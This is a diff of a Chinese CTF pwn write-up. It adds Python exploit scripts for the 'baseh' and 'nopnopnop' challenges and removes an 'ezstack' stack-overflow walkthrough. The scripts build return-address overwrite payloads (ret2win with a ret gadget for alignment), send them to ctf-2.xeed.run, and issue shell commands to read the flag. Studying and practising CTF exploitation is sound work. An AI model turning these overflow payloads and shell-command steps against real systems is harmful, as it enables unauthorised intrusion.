@@ -844,105 +844,128 @@ else:
 
 ## baseh
 
+
+
+代码：
+```python
+import socket
+import struct
+import base64
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 31679
+
+def p32(x):
+    return struct.pack("<I", x)
+
+correct = 0x0804925f
+bss_buf = 0x0811eb40
+
+raw = p32(0xdeadbeef)
+raw += p32(correct)
+raw += p32(bss_buf)
+
+payload = base64.b64encode(raw)
+
+print("[+] raw payload:", raw.hex())
+print("[+] base64 payload:", payload.decode())
+
+s = socket.create_connection((HOST, PORT), timeout=8)
+
+data = s.recv(4096)
+print(data.decode(errors="ignore"))
+
+s.sendall(payload + b"\n")
+
+time.sleep(0.5)
+
+# 拿到 shell 后尝试读 flag
+s.sendall(b"cat /flag 2>/dev/null; cat flag* 2>/dev/null\n")
+
+time.sleep(0.5)
+
+try:
+    while True:
+        data = s.recv(4094096)
+        if not data:
+            break
+        print(data.decode(errors="ignore"), end="")
+except:
+    pass
+```
+
 ## nopnopnop
 
 
 
-<folder title="点击展开" style="3" height="420px">
 
-## ezstack
 
-使用 IDA 打开程序，Shift + F12 搜字符串套转到主逻辑函数部分：
-
-![函数主逻辑部分](./pwm/ezstack/ida_main.png)
-
-这里看到ReadingBuffer的大小只有112，没有做防溢出保护
-
-然后程序为64位程序
-
-![64位程序](./pwm/ezstack/64.png)
-
-所以我们构造一个这样的栈布局实现入侵：
-
-<padding expand="16">
-
-![evil的地址](/assets/local-svg/ezstack.drawio.p16.svg)
-
-</padding>
-
-即通过写入112个A字符写到[rbp+0]的位置，然后在[rbp+8]的位置放入一个任意地址的retn指令实现linux 64位程序所需要的16位对齐，再在[rbp+16]的位置放入evil函数的地址即可完成栈溢出攻击。
-
-再查询evil的地址：
-
-![evil的地址](./pwm/ezstack/400507.png)
-
-于是有了以下代码：
+代码：
 ```python
 import socket
 import struct
+import re
 import time
 
 HOST = "ctf-2.xeed.run"
-PORT = 30832
+PORT = 30087
 
-def p64(x):
-    return struct.pack("<Q", x)
+offset = 0x108
 
-ret = 0x400506
-evil = 0x400507
+def recv_until(s, mark=b">"):
+    data = b""
+    while mark not in data:
+        chunk = s.recv(1)
+        if not chunk:
+            break
+        data += chunk
+    return data
 
-payload = b"A" * 120
-payload += p64(ret)
-payload += p64(evil)
+s = socket.create_connection((HOST, PORT), timeout=10)
+s.settimeout(8)
+s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
-s = socket.create_connection((HOST, PORT))
-s.settimeout(2)
+banner = recv_until(s, b">")
+print(banner.decode(errors="ignore"), end="")
 
-# 接收题目提示
-try:
-    data = s.recv(4096)
-    print(data.decode(errors="ignore"), end="")
-except:
-    pass
+m = re.search(rb"Target:\s*(0x[0-9a-fA-F]+)", banner)
+if not m:
+    print("\n[-] 没找到 Target")
+    exit()
 
-# 发送溢出 payload
-s.sendall(payload + b"\n")
+target = int(m.group(1), 16)
+ret_gadget = target - 1   # 0x40127a: ret
 
-time.sleep(0.2)
+print(f"\n[+] target     = {hex(target)}")
+print(f"[+] ret gadget = {hex(ret_gadget)}")
 
-# evil() 里会 system("/bin/sh")，这里给 shell 发命令
-cmds = [
-    b"id\n",
-    b"pwd\n",
-    b"ls -la\n",
-    b"cat flag 2>/dev/null\n",
-    b"cat flag.txt 2>/dev/null\n",
-    b"cat /flag 2>/dev/null\n",
-    b"cat /flag.txt 2>/dev/null\n",
-    b"find / -name '*flag*' 2>/dev/null\n",
-]
+payload = b"A" * offset
+payload += struct.pack("<Q", ret_gadget)
+payload += struct.pack("<Q", target)
+payload += b"\n"
 
-for cmd in cmds:
-    s.sendall(cmd)
-    time.sleep(0.1)
+print(f"[+] payload length = {len(payload)}")
+print("[+] sending aligned ret2win payload...")
 
-# 持续接收输出
+s.sendall(payload)
+
+# 不要 shutdown
+time.sleep(0.5)
+
+out = b""
 while True:
     try:
-        data = s.recv(4096)
-        if not data:
+        chunk = s.recv(4096)
+        if not chunk:
             break
-        print(data.decode(errors="ignore"), end="")
+        out += chunk
     except socket.timeout:
         break
+
+print(out.decode(errors="ignore"), end="")
+s.close()
 ```
-
-flag截图：
-
-![flag](./pwm/ezstack/ezstack_flag.png)
-
-
-</folder>
 
 | 题目类型 | 题目名 | 难度 |
 | :--- | :--- | :--- |
